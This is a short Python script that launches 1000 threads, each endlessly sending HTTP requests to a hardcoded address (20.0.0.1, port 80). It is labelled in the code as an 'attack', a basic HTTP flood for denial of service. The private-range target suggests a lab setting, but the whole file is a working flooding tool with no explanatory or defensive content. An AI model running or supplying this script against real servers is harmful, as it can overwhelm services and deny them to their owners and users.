#!/usr/bin/python3

import threading, time
import urllib.request, urllib.error

HOST_NAME = '20.0.0.1'
PORT_NUMBER = 80


class attack_thread(threading.Thread):
	def run(self):
		while True:
			url_str = 'http://'+HOST_NAME+':'+str(PORT_NUMBER)
			print('connection:', url_str)
			try:
				connection = urllib.request.urlopen(url_str, timeout=1)
				connection.getcode()
			except:
				pass


try:
	for _ in range(1000):
		thread=attack_thread()
		thread.daemon=True
		thread.start()
	while True:
		time.sleep(100)
except (KeyboardInterrupt, SystemExit):
	print('\nReceived keyboard interrupt, quitting attack.\n')
